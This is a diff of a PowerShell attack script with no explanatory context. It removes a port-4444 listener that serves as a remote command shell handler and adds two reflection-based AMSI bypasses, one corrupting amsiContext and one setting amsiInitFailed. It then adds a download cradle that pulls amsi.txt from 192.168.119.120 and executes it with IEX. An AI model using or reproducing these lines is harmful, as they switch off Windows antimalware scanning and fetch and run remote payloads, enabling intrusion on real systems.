@@ -1,24 +1,7 @@
-$listener = [System.Net.Sockets.TcpListener]::new(4444)
-$listener.Start()
-$client = $listener.AcceptTcpClient()
-$stream = $client.GetStream()
-$writer = New-Object System.IO.StreamWriter($stream)
-$writer.AutoFlush = $true
-$reader = New-Object System.IO.StreamReader($stream)
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
 
-try {
-    while ($true) {
-        $command = Read-Host "PS>"
-        if ($command -eq "exit") { break }
-        $writer.WriteLine($command)
 
-        Start-Sleep -Milliseconds 200  # 给客户端时间处理
-        if ($reader.Peek() -eq -1) { break }  # 处理断开问题
-        Write-Host ($reader.ReadLine())
-    }
-} catch {
-    Write-Host "Error: $_"
-} finally {
-    $client.Close()
-    $listener.Stop()
-}
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}};$f.SetValue($null,$true)
+
+
+(new-object system.net.webclient).downloadstring('http://192.168.119.120/amsi.txt') | IEX
